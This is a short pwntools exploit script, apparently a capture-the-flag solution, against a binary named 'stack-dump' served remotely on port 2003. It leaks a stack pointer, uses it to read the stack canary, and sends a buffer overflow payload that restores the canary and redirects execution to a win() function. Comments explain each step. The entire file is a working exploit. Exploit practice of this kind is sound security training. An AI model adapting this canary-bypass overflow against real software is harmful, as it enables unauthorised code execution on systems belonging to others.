#!/usr/bin/env python2.7

from pwn import *

global p

def start():
    prog  = "./stack-dump"
    ip   = "plsdonthaq.me"
    port = 2003

    if args.REMOTE:
        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        context.terminal = ['urxvt', '-e', 'sh', '-c']
        p = gdb.debug(prog)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

    return p

def input(length, payload):
    p.sendlineafter("quit\n", "a")
    p.sendlineafter("len:", length)
    p.sendline(payload)

def dump():
    p.sendlineafter("quit\n", "b")
    p.recvuntil(": ")
    return p.recvuntil("\n", drop=True)[:4]

p = start()

# Grab the pointer provided and offset it to the address of the canary
p.recvuntil("pointer ")
pointer = int(p.recvuntil("\n"), 16) + (0x75 - 0xc)

# dump the memory (canary) at the address
input("4", p32(pointer))
canary = u32(dump())

# Buffer overflow to override the canary with the leaked canary, and the EIP with the address of win()
payload = b"A" * (0x6c - 0xc)
payload += p32(canary)
payload += b"A" * 0x8
payload += p32(0x080486c6)
input(str(len(payload)), payload)

p.sendlineafter("quit\n", "d")

p.interactive()